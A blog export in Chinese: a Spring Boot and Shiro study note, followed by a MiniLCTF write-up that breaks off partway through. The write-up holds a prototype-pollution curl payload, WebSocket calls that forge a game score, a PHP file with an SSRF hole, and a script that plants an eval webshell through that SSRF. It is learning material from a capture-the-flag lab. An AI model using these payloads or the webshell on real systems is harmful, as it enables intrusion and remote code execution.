可以在IDEA右侧的maven控制台打包为jar，这样就可以不启动IDEA，就能在本机8080端口运行了\npom.xml\nspring-boot-dependencies:核心依赖在父工程中 启动器\n1 2 3 4 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-web\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; 主程序\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 package com.test.springtest; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; @SpringBootApplication//标注这个类是一个springboot的应用 public class SpringtestApplication { public static void main(String[] args) { //启动springBoot应用 SpringApplication.run(SpringtestApplication.class, args); } } yaml语法 前下的端口配置在yaml里是这样的\n1 2 server: port: 8080 :后面一定要跟空格\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 # 普通的key-value name: abc # 对象 student: name: abc age: 111 # 行内写法 student: {name: abc,age: 111} # 数组 pets: - cat - dog - pig pets: [cat,dog,pig] yaml可以注入到配置类中\n在实体类中用@ConfigurationProperties注解就能注入值,用prefix指定对象\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 package com.test.springtest.value; import org.springframework.boot.context.properties.ConfigurationProperties; import org.springframework.stereotype.Component; import java.util.Date; import java.util.List; import java.util.Map; @Component @ConfigurationProperties(prefix=\u0026#34;person\u0026#34;) public class person { private String name; private int age; private Boolean happy; private Date date; private Map\u0026lt;String,Object\u0026gt; maps; private List\u0026lt;Object\u0026gt; lists; public person() { } public person(String name, int age, Boolean happy, Date date, Map\u0026lt;String, Object\u0026gt; maps, List\u0026lt;Object\u0026gt; lists) { this.name = name; this.age = age; this.happy = happy; this.date = date; this.maps = maps; this.lists = lists; } public String getName() { return name; } public int getAge() { return age; } public Boolean getHappy() { return happy; } public Date getDate() { return date; } public Map\u0026lt;String, Object\u0026gt; getMaps() { return maps; } public List\u0026lt;Object\u0026gt; getLists() { return lists; } public void setName(String name) { this.name = name; } public void setAge(int age) { this.age = age; } public void setHappy(Boolean happy) { this.happy = happy; } public void setDate(Date date) { this.date = date; } public void setMaps(Map\u0026lt;String, Object\u0026gt; maps) { this.maps = maps; } public void setLists(List\u0026lt;Object\u0026gt; lists) { this.lists = lists; } @Override public String toString() { return \u0026#34;person{\u0026#34; + \u0026#34;name=\u0026#39;\u0026#34; + name + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#34;, age=\u0026#34; + age + \u0026#34;, happy=\u0026#34; + happy + \u0026#34;, date=\u0026#34; + date + \u0026#34;, maps=\u0026#34; + maps + \u0026#34;, lists=\u0026#34; + lists + \u0026#39;}\u0026#39;; } } 定义完一个person类之后，用yaml来给对象赋值\n1 2 3 4 5 6 7 8 9 10 11 12 person: name: abc age: 111 happy: true date: 2022/01/11 maps: k1: v1 k2: v2 lists: - music - abc - code 最后在test里面执行，先引入person类\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package com.test.springtest; import com.test.springtest.value.person; import org.junit.jupiter.api.Test; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.boot.test.context.SpringBootTest; @SpringBootTest class SpringtestApplicationTests { @Autowired private person person; @Test void contextLoads() { System.out.println(person); } } 还能指定加载配置文件\n1 @PropertySource(value = \u0026#34;classpath:application.properties\u0026#34;) 赋值就麻烦了\n1 2 //SPEL表达式取值 @Value(\u0026#34;${name}\u0026#34;) JSR303校验 1 @Validated 下面的class可以指定格式来校验，比如邮箱格式\n1 @Email(message=\u0026#34;xxx\u0026#34;) springboot的多环境配置：可以选择激活哪一个配置文件\n比如我们新建了application-dev.properties,在application.properties里面这样激活\n1 spring.profiles.active=dev yaml更简单\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 server: port: 8080 spring: profiles: active: dev --- server: port: 8080 spring: profiles: dev --- server: port: 8080 spring: profiles: test web开发 导入静态资源，去webjars官网下jquery，用maven引入\n测试url\n1 http://127.0.0.1:8080/webjars/jquery/3.7.1/jquery.js 读源码发现classpath有多个可以被解析\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 public void addResourceHandlers(ResourceHandlerRegistry registry) { if (!this.resourceProperties.isAddMappings()) { logger.debug(\u0026#34;Default resource handling disabled\u0026#34;); } else { this.addResourceHandler(registry, this.mvcProperties.getWebjarsPathPattern(), \u0026#34;classpath:/META-INF/resources/webjars/\u0026#34;); this.addResourceHandler(registry, this.mvcProperties.getStaticPathPattern(), (Consumer)((registration) -\u0026gt; { registration.addResourceLocations(this.resourceProperties.getStaticLocations()); if (this.servletContext != null) { ServletContextResource resource = new ServletContextResource(this.servletContext, \u0026#34;/\u0026#34;); registration.addResourceLocations(new Resource[]{resource}); } })); } } 跟进resourceProperties\n1 2 3 4 5 6 7 public static class Resources { private static final String[] CLASSPATH_RESOURCE_LOCATIONS = new String[]{\u0026#34;classpath:/META-INF/resources/\u0026#34;, \u0026#34;classpath:/resources/\u0026#34;, \u0026#34;classpath:/static/\u0026#34;, \u0026#34;classpath:/public/\u0026#34;}; private String[] staticLocations; private boolean addMappings; private boolean customized; private final Chain chain; private final Cache cache; /resources/ /static/ /public/ /META-INF/resources/ 注意：不要轻易去该配置文件里面\n1 2 3 spring: mvc: static-path-pattern: /** 如果把前端代码写到templates下面，要用controller来跳转，而且要模板引擎来渲染\n这里用Thymeleaf,\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 public class ThymeleafProperties { private static final Charset DEFAULT_ENCODING; public static final String DEFAULT_PREFIX = \u0026#34;classpath:/templates/\u0026#34;; public static final String DEFAULT_SUFFIX = \u0026#34;.html\u0026#34;; private boolean checkTemplate = true; private boolean checkTemplateLocation = true; private String prefix = \u0026#34;classpath:/templates/\u0026#34;; private String suffix = \u0026#34;.html\u0026#34;; private String mode = \u0026#34;HTML\u0026#34;; private Charset encoding; private boolean cache; private Integer templateResolverOrder; private String[] viewNames; private String[] excludedViewNames; private boolean enableSpringElCompiler; private boolean renderHiddenMarkersBeforeCheckboxes; private boolean enabled; private final Servlet servlet; private final Reactive reactive; 可以看到在templates目录下以html为后缀的才被解析\ncontroller\n1 2 3 4 5 6 7 8 9 10 11 12 package com.test.springtest.controller; import org.springframework.stereotype.Controller; import org.springframework.web.bind.annotation.RequestMapping; @Controller public class index { @RequestMapping(\u0026#34;/test\u0026#34;) public String test(){ return \u0026#34;test\u0026#34;; } } 只要在templates下写同名的html，就能被渲染\nthymeleaf语法 跟着中文文档来教程：使用 Thymeleaf - 中文文档\ncontroller\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 package com.test.springtest.controller; import org.springframework.stereotype.Controller; import org.springframework.ui.Model; import org.springframework.web.bind.annotation.RequestMapping; @Controller public class index { @RequestMapping(\u0026#34;/test\u0026#34;) public String test(Model model) { model.addAttribute(\u0026#34;msg\u0026#34;, \u0026#34;哈基米南北绿豆\u0026#34;); return \u0026#34;test\u0026#34;; } } test.html\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34; xmlns:th=\u0026#34;http://www.thymeleaf.org\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Title\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;!--所有的html元素都能被thymeleaf替换 th：元素名--\u0026gt; \u0026lt;div th:text=\u0026#34;${msg}\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 总结\n1 2 3 4 5 6 简单表达式： 变量表达式：${...} 选择变量表达式：*{...} 消息表达式：#{...} 链接URL表达式：@{...} 片段表达式：~{...} 数据库这里直接跳了\nspringsecurity Spring Security 中文文档 :: Spring Security Reference\nshiro Apache Shiro | Java Security Framework\nshiroconfig.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 package com.test.springtest.config; import org.apache.shiro.authc.AuthenticationException; import org.apache.shiro.authc.AuthenticationInfo; import org.apache.shiro.authc.AuthenticationToken; import org.apache.shiro.authz.AuthorizationInfo; import org.apache.shiro.spring.web.ShiroFilterFactoryBean; import org.apache.shiro.subject.PrincipalCollection; import org.apache.shiro.web.mgt.DefaultWebSecurityManager; import org.springframework.beans.factory.annotation.Qualifier; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; import java.util.LinkedHashMap; import java.util.Map; @Configuration public class shiroconfig { @Bean public ShiroFilterFactoryBean getShiroFilterFactoryBean(@Qualifier(\u0026#34;securityManager\u0026#34;) DefaultWebSecurityManager securityManager) { ShiroFilterFactoryBean bean = new ShiroFilterFactoryBean(); bean.setSecurityManager(securityManager); /* * anno:无需认证 * authc:必须认证 * user:必须remeberme * perms:拥有某个资源权限 * role:拥有某个角色权限 * */ Map\u0026lt;String, String\u0026gt; filterChainDefinitionMap = new LinkedHashMap\u0026lt;\u0026gt;(); filterChainDefinitionMap.put(\u0026#34;/user/add\u0026#34;, \u0026#34;anno\u0026#34;); filterChainDefinitionMap.put(\u0026#34;/user/update\u0026#34;, \u0026#34;anno\u0026#34;); bean.setFilterChainDefinitionMap(filterChainDefinitionMap); bean.setLoginUrl(\u0026#34;/login\u0026#34;); return bean; } @Bean public DefaultWebSecurityManager securityManager(@Qualifier(\u0026#34;userRealm\u0026#34;) userrealm userRealm) { DefaultWebSecurityManager manager = new DefaultWebSecurityManager(); manager.setRealm(userRealm); return manager; } @Bean public userrealm userRealm(){ return new userrealm() { @Override protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principalCollection) { return super.doGetAuthorizationInfo(principalCollection); } @Override protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken authenticationToken) throws AuthenticationException { return super.doGetAuthenticationInfo(authenticationToken); } }; } } userrealm.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 package com.test.springtest.config; import org.apache.shiro.authc.AuthenticationException; import org.apache.shiro.authc.AuthenticationInfo; import org.apache.shiro.authc.AuthenticationToken; import org.apache.shiro.authc.credential.CredentialsMatcher; import org.apache.shiro.authz.AuthorizationInfo; import org.apache.shiro.cache.CacheManager; import org.apache.shiro.realm.AuthorizingRealm; import org.apache.shiro.subject.PrincipalCollection; public abstract class userrealm extends AuthorizingRealm { //授权 @Override protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principalCollection) { System.out.println(\u0026#34;授权doGetAuthorizationInfo\u0026#34;); return null; } //认证 @Override protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken authenticationToken) throws AuthenticationException { System.out.println(\u0026#34;认证doGetAuthenticationInfo\u0026#34;); return null; } } index.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 package com.test.springtest.controller; import org.apache.shiro.SecurityUtils; import org.apache.shiro.authc.IncorrectCredentialsException; import org.apache.shiro.authc.UnknownAccountException; import org.apache.shiro.authc.UsernamePasswordToken; import org.apache.shiro.subject.Subject; import org.springframework.stereotype.Controller; import org.springframework.ui.Model; import org.springframework.web.bind.annotation.RequestMapping; import java.util.ArrayList; import java.util.Arrays; @Controller public class index { @RequestMapping({\u0026#34;/index\u0026#34;,\u0026#34;/\u0026#34;}) public String test(Model model) { model.addAttribute(\u0026#34;msg\u0026#34;, \u0026#34;哈基米南北绿豆\u0026#34;); model.addAttribute(\u0026#34;users\u0026#34;, Arrays.asList(\u0026#34;哈基米\u0026#34;,\u0026#34;曼波\u0026#34;)); return \u0026#34;index\u0026#34;; } @RequestMapping(\u0026#34;/user/add\u0026#34;) public String add(){ return \u0026#34;user/add\u0026#34;; } @RequestMapping(\u0026#34;/user/update\u0026#34;) public String update(){ return \u0026#34;user/update\u0026#34;; } @RequestMapping(\u0026#34;/toLogin\u0026#34;) public String toLogin(){ return \u0026#34;login\u0026#34;; } @RequestMapping(\u0026#34;/login\u0026#34;) public String login(String username, String password, Model model){ //获取当前用户 Subject subject = SecurityUtils.getSubject(); //封装用户登入数据 UsernamePasswordToken Token = new UsernamePasswordToken(username, password, true); try{ subject.login(Token); return \u0026#34;redirect:/index\u0026#34;; }catch (UnknownAccountException e){ model.addAttribute(\u0026#34;msg\u0026#34;, \u0026#34;用户名错误\u0026#34;); return \u0026#34;login\u0026#34;; }catch (IncorrectCredentialsException e){ model.addAttribute(\u0026#34;msg\u0026#34;, \u0026#34;密码错误\u0026#34;); return \u0026#34;login\u0026#34;; } } } ","date":"2025-05-23T00:00:00Z","image":"https://0d000721999.github.io/p/java%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/1.jpg","permalink":"https://0d000721999.github.io/p/java%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/","title":"java语法学习"},{"content":"MiniLCTF复现 Click and click 要求点10000下，抓包没成功，没有网络请求\n查看wappalyzer,Svelte前端，用vue打包\n用控制台指令点10000下\n1 2 let button = document.querySelector(\u0026#39;button\u0026#39;) for (let i = 0; i \u0026lt; 10000; i++) { button.click(); } 响应说按的太快了，直接curl发一样的请求还是回显按的太快了，10000次前端回显了一段代码\n1 2 3 4 什么叫“前后端分离”啊？（战术后仰） if ( req.body.point.amount == 0 || req.body.point.amount == null) { delete req.body.point.amount } 当后续代码尝试读取 req.body.point.amount 时，由于实例上（req.body.point 对象本身）的 amount 已经被删除了，JavaScript 会沿着原型链向上查找。猜测是原型链污染：\n1 2 3 4 5 6 7 8 { \u0026#34;type\u0026#34;: \u0026#34;set\u0026#34;, \u0026#34;point\u0026#34;: { \u0026#34;__proto__\u0026#34;: { \u0026#34;amount\u0026#34;: 10000 } } } curl一下,不成功就重启容器\n1 curl -X POST -H \u0026#34;Content-Type: application/json\u0026#34; -d \u0026#34;{\\\u0026#34;type\\\u0026#34;:\\\u0026#34;set\\\u0026#34;,\\\u0026#34;point\\\u0026#34;:{\\\u0026#34;__proto__\\\u0026#34;:{\\\u0026#34;amount\\\u0026#34;:10000}}}\u0026#34; http://127.0.0.1:51264/update-amount linux用这个\n1 2 3 4 curl -X POST \\ -H \u0026#34;Content-Type: application/json\u0026#34; \\ -d \u0026#39;{\u0026#34;type\u0026#34;:\u0026#34;set\u0026#34;,\u0026#34;point\u0026#34;:{\u0026#34;__proto__\u0026#34;:{\u0026#34;amount\u0026#34;:10000}}}\u0026#39; \\ http://127.0.0.1:51264/update-amount GuessOneGuess 下载附件，输出flag的源码是game-ws.js\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 module.exports = function(io) { io.on(\u0026#39;connection\u0026#39;, (socket) =\u0026gt; { let targetNumber = Math.floor(Math.random() * 100) + 1; let guessCount = 0; let totalScore = 0; const FLAG = process.env.FLAG || \u0026#34;miniL{THIS_IS_THE_FLAG}\u0026#34;; console.log(`新连接 - 目标数字: ${targetNumber}`); socket.emit(\u0026#39;game-message\u0026#39;, { type: \u0026#39;welcome\u0026#39;, message: \u0026#39;猜一个1-100之间的数字！\u0026#39;, score: totalScore }); socket.on(\u0026#39;guess\u0026#39;, (data) =\u0026gt; { try { console.log(totalScore); const guess = parseInt(data.value); if (isNaN(guess)) { throw new Error(\u0026#39;请输入有效数字\u0026#39;); } if (guess \u0026lt; 1 || guess \u0026gt; 100) { throw new Error(\u0026#39;请输入1-100之间的数字\u0026#39;); } guessCount++; if (guess === targetNumber) { const currentScore = Math.floor(100 / Math.pow(2, guessCount - 1)); totalScore += currentScore; let message = `🎉 猜对了！得分 +${currentScore} (总分数: ${totalScore})`; let showFlag = false; if (totalScore \u0026gt; 1.7976931348623157e308) { message += `\\n🏴 ${FLAG}`; showFlag = true; } socket.emit(\u0026#39;game-message\u0026#39;, { type: \u0026#39;result\u0026#39;, win: true, message: message, score: totalScore, showFlag: showFlag, currentScore: currentScore }); targetNumber = Math.floor(Math.random() * 100) + 1; console.log(`新目标数字: ${targetNumber}`); guessCount = 0; } else { if (guessCount \u0026gt;= 100) { console.log(\u0026#34;100次未猜中！将扣除当前分数并重置\u0026#34;); socket.emit(\u0026#39;punishment\u0026#39;, { message: \u0026#34;100次未猜中！将扣除当前分数并重置\u0026#34;, }); return; } socket.emit(\u0026#39;game-message\u0026#39;, { type: \u0026#39;result\u0026#39;, win: false, message: guess \u0026lt; targetNumber ? \u0026#39;太小了！\u0026#39; : \u0026#39;太大了！\u0026#39;, score: totalScore }); } } catch (err) { socket.emit(\u0026#39;game-message\u0026#39;, { type: \u0026#39;error\u0026#39;, message: err.message, score: totalScore }); } }); socket.on(\u0026#39;punishment-response\u0026#39;, (data) =\u0026gt; { totalScore -= data.score; guessCount = 0; targetNumber = Math.floor(Math.random() * 100) + 1; console.log(`新目标数字: ${targetNumber}`); socket.emit(\u0026#39;game-message\u0026#39;, { type: \u0026#39;result\u0026#39;, win: true, message: \u0026#34;扣除分数并重置\u0026#34;, score: totalScore, showFlag: false, }); }); }); }; 分数需要大于1.7976931348623157e308,它其实就是 JS 所使用的 IEEE 754 标准的双精度浮点数（64位）所能表示的最大的有限正数（可以通过 Number.MAX_VALUE 来获取）\n在 Javascript 中，进行计算时结果超出了 Number.MAX_VALUE 时，会将结果表示为 Infinity\nInfinity \u0026gt; Number.MAX_VALUE 的结果是 true，所以需要让分数达到 Infinity\n试了几遍发现限制次数内根本不可能达到那个分数\n看到这一串代码\n1 2 3 4 5 6 7 8 9 10 11 12 socket.on(\u0026#39;punishment-response\u0026#39;, (data) =\u0026gt; { totalScore -= data.score; guessCount = 0; targetNumber = Math.floor(Math.random() * 100) + 1; console.log(`新目标数字: ${targetNumber}`); socket.emit(\u0026#39;game-message\u0026#39;, { type: \u0026#39;result\u0026#39;, win: true, message: \u0026#34;扣除分数并重置\u0026#34;, score: totalScore, showFlag: false, }); 用于扣除分数\n给的附件还有game.pug\n找到punishment-response\n1 2 3 socket.on(\u0026#34;punishment\u0026#34;, (data) =\u0026gt; { socket.emit(\u0026#34;punishment-response\u0026#34;, { score: scoreDisplay.textContent} ); }) 只要发过去一个超大负数就行了\nJSON 不支持 Infinity，如果设置 score 为 -Infinity 序列化会变成 null，所以就设为 -1.7976931348623157e308\n控制台赋值\n1 2 let socket = io() socket.emit(\u0026#34;punishment-response\u0026#34;, { score: -1.7976931348623157e308}) 那么再发一次就变成 Infinity 了，这里一定要再发一遍赋值，此时看服务端响应 JSON score 是 null，正如前面所说 JSON 不支持 Infinity，所以序列化为 JSON 会变成 null。实际上总分应该是 Infinity 了。只要再猜对一次应该就能让服务端触发分数判断返回 flag\n再网页中再猜对一次还是从0开始，这是因为前面的操作重新创建了socket会话，用前面那个会话猜\n1 socket.on(\u0026#39;game-message\u0026#39;, (data) =\u0026gt; { console.log(data) }) 至于猜数字，前下game.pug里面利用的是这样\n1 socket.emit(\u0026#39;guess\u0026#39;, { value: guessInput.value }); Miniup 自己做的时候做到任意文件读取和ssrf就不会了，没想到还能写马\n读到index.php\n里面有个5000端口的dufs服务\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 \u0026lt;?php $dufs_host = \u0026#39;127.0.0.1\u0026#39;; $dufs_port = \u0026#39;5000\u0026#39;; if ($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] === \u0026#39;POST\u0026#39; \u0026amp;\u0026amp; isset($_POST[\u0026#39;action\u0026#39;]) \u0026amp;\u0026amp; $_POST[\u0026#39;action\u0026#39;] === \u0026#39;upload\u0026#39;) { if (isset($_FILES[\u0026#39;file\u0026#39;])) { $file = $_FILES[\u0026#39;file\u0026#39;]; $filename = $file[\u0026#39;name\u0026#39;]; $allowed_extensions = [\u0026#39;jpg\u0026#39;, \u0026#39;jpeg\u0026#39;, \u0026#39;png\u0026#39;, \u0026#39;gif\u0026#39;, \u0026#39;bmp\u0026#39;, \u0026#39;webp\u0026#39;]; $file_extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION)); if (!in_array($file_extension, $allowed_extensions)) { echo json_encode([\u0026#39;success\u0026#39; =\u0026gt; false, \u0026#39;message\u0026#39; =\u0026gt; \u0026#39;只允许上传图片文件\u0026#39;]); exit; } $target_url = \u0026#39;http://\u0026#39; . $dufs_host . \u0026#39;:\u0026#39; . $dufs_port . \u0026#39;/\u0026#39; . rawurlencode($filename); $file_content = file_get_contents($file[\u0026#39;tmp_name\u0026#39;]); $ch = curl_init($target_url); curl_setopt($ch, CURLOPT_CUSTOMREQUEST, \u0026#39;PUT\u0026#39;); curl_setopt($ch, CURLOPT_POSTFIELDS, $file_content); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_HTTPHEADER, [ \u0026#39;Host: \u0026#39; . $dufs_host . \u0026#39;:\u0026#39; . $dufs_port, \u0026#39;Origin: http://\u0026#39; . $dufs_host . \u0026#39;:\u0026#39; . $dufs_port, \u0026#39;Referer: http://\u0026#39; . $dufs_host . \u0026#39;:\u0026#39; . $dufs_port . \u0026#39;/\u0026#39;, \u0026#39;Accept-Encoding: gzip, deflate\u0026#39;, \u0026#39;Accept: */*\u0026#39;, \u0026#39;Accept-Language: en,zh-CN;q=0.9,zh;q=0.8\u0026#39;, \u0026#39;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36\u0026#39;, \u0026#39;Content-Length: \u0026#39; . strlen($file_content) ]); $response = curl_exec($ch); $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE); curl_close($ch); if ($http_code \u0026gt;= 200 \u0026amp;\u0026amp; $http_code \u0026lt; 300) { echo json_encode([\u0026#39;success\u0026#39; =\u0026gt; true, \u0026#39;message\u0026#39; =\u0026gt; \u0026#39;图片上传成功\u0026#39;]); } else { echo json_encode([\u0026#39;success\u0026#39; =\u0026gt; false, \u0026#39;message\u0026#39; =\u0026gt; \u0026#39;图片上传失败，请稍后再试\u0026#39;]); } exit; } else { echo json_encode([\u0026#39;success\u0026#39; =\u0026gt; false, \u0026#39;message\u0026#39; =\u0026gt; \u0026#39;未选择图片\u0026#39;]); exit; } } if ($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] === \u0026#39;POST\u0026#39; \u0026amp;\u0026amp; isset($_POST[\u0026#39;action\u0026#39;]) \u0026amp;\u0026amp; $_POST[\u0026#39;action\u0026#39;] === \u0026#39;search\u0026#39;) { if (isset($_POST[\u0026#39;query\u0026#39;]) \u0026amp;\u0026amp; !empty($_POST[\u0026#39;query\u0026#39;])) { $search_query = $_POST[\u0026#39;query\u0026#39;]; if (!ctype_alnum($search_query)) { echo json_encode([\u0026#39;success\u0026#39; =\u0026gt; false, \u0026#39;message\u0026#39; =\u0026gt; \u0026#39;只允许输入数字和字母\u0026#39;]); exit; } $search_url = \u0026#39;http://\u0026#39; . $dufs_host . \u0026#39;:\u0026#39; . $dufs_port . \u0026#39;/?q=\u0026#39; . urlencode($search_query) . \u0026#39;\u0026amp;json\u0026#39;; $ch = curl_init($search_url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_HTTPHEADER, [ \u0026#39;Host: \u0026#39; . $dufs_host . \u0026#39;:\u0026#39; . $dufs_port, \u0026#39;Accept: */*\u0026#39;, \u0026#39;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36\u0026#39; ]); $response = curl_exec($ch); $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE); curl_close($ch); if ($http_code \u0026gt;= 200 \u0026amp;\u0026amp; $http_code \u0026lt; 300) { $response_data = json_decode($response, true); if (isset($response_data[\u0026#39;paths\u0026#39;]) \u0026amp;\u0026amp; is_array($response_data[\u0026#39;paths\u0026#39;])) { $image_extensions = [\u0026#39;jpg\u0026#39;, \u0026#39;jpeg\u0026#39;, \u0026#39;png\u0026#39;, \u0026#39;gif\u0026#39;, \u0026#39;bmp\u0026#39;, \u0026#39;webp\u0026#39;]; $filtered_paths = []; foreach ($response_data[\u0026#39;paths\u0026#39;] as $item) { $file_name = $item[\u0026#39;name\u0026#39;]; $extension = strtolower(pathinfo($file_name, PATHINFO_EXTENSION)); if (in_array($extension, $image_extensions) || ($item[\u0026#39;path_type\u0026#39;] === \u0026#39;Directory\u0026#39;)) { $filtered_paths[] = $item; } } $response_data[\u0026#39;paths\u0026#39;] = $filtered_paths; echo json_encode([\u0026#39;success\u0026#39; =\u0026gt; true, \u0026#39;result\u0026#39; =\u0026gt; json_encode($response_data)]); } else { echo json_encode([\u0026#39;success\u0026#39; =\u0026gt; true, \u0026#39;result\u0026#39; =\u0026gt; $response]); } } else { echo json_encode([\u0026#39;success\u0026#39; =\u0026gt; false, \u0026#39;message\u0026#39; =\u0026gt; \u0026#39;搜索失败，请稍后再试\u0026#39;]); } exit; } else { echo json_encode([\u0026#39;success\u0026#39; =\u0026gt; false, \u0026#39;message\u0026#39; =\u0026gt; \u0026#39;请输入搜索关键词\u0026#39;]); exit; } } if ($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] === \u0026#39;POST\u0026#39; \u0026amp;\u0026amp; isset($_POST[\u0026#39;action\u0026#39;]) \u0026amp;\u0026amp; $_POST[\u0026#39;action\u0026#39;] === \u0026#39;view\u0026#39;) { if (isset($_POST[\u0026#39;filename\u0026#39;]) \u0026amp;\u0026amp; !empty($_POST[\u0026#39;filename\u0026#39;])) { $filename = $_POST[\u0026#39;filename\u0026#39;]; $file_content = @file_get_contents($filename, false, @stream_context_create($_POST[\u0026#39;options\u0026#39;])); if ($file_content !== false) { $base64_image = base64_encode($file_content); $mime_type = \u0026#39;image/jpeg\u0026#39;; echo json_encode([ \u0026#39;success\u0026#39; =\u0026gt; true, \u0026#39;is_image\u0026#39; =\u0026gt; true, \u0026#39;base64_data\u0026#39; =\u0026gt; \u0026#39;data:\u0026#39; . $mime_type . \u0026#39;;base64,\u0026#39; . $base64_image ]); } else { echo json_encode([\u0026#39;success\u0026#39; =\u0026gt; false, \u0026#39;message\u0026#39; =\u0026gt; \u0026#39;无法获取图片\u0026#39;]); } exit; } else { echo json_encode([\u0026#39;success\u0026#39; =\u0026gt; false, \u0026#39;message\u0026#39; =\u0026gt; \u0026#39;请输入图片路径\u0026#39;]); exit; } } ?\u0026gt; 查看github:https://github.com/sigoden/dufs\n利用ssrf查看当前目录文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 { \u0026#34;href\u0026#34;: \u0026#34;/\u0026#34;, \u0026#34;kind\u0026#34;: \u0026#34;Index\u0026#34;, \u0026#34;uri_prefix\u0026#34;: \u0026#34;/\u0026#34;, \u0026#34;allow_upload\u0026#34;: true, \u0026#34;allow_delete\u0026#34;: false, \u0026#34;allow_search\u0026#34;: true, \u0026#34;allow_archive\u0026#34;: false, \u0026#34;dir_exists\u0026#34;: true, \u0026#34;auth\u0026#34;: false, \u0026#34;user\u0026#34;: null, \u0026#34;paths\u0026#34;: [ { \u0026#34;path_type\u0026#34;: \u0026#34;File\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;dufs\u0026#34;, \u0026#34;mtime\u0026#34;: 1745487158000, \u0026#34;size\u0026#34;: 4488672 }, { \u0026#34;path_type\u0026#34;: \u0026#34;File\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;index.php\u0026#34;, \u0026#34;mtime\u0026#34;: 1745500647000, \u0026#34;size\u0026#34;: 16464 } ] } 说明我们可以控制这个dufs服务，接下来就是传马了\n用脚本传马\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import requests url = \u0026#39;http://127.0.0.1:60583\u0026#39; payload = \u0026#39;\u0026lt;?php @eval($_POST[\u0026#34;cmd\u0026#34;]);?\u0026gt;\u0026#39; try: resp = requests.post( url + \u0026#34;/index.php\u0026#34;, data={ \u0026#39;action\u0026#39;: \u0026#39;view\u0026#39;, \u0026#39;filename\u0026#39;: \u0026#39;http://127.0.0.1:5000/shell.php\u0026#39;, \u0026#34;options[http][method]\u0026#34;: \u0026#34;PUT\u0026#34;, \u0026#34;options[http][content]\u0026#34;: payload, 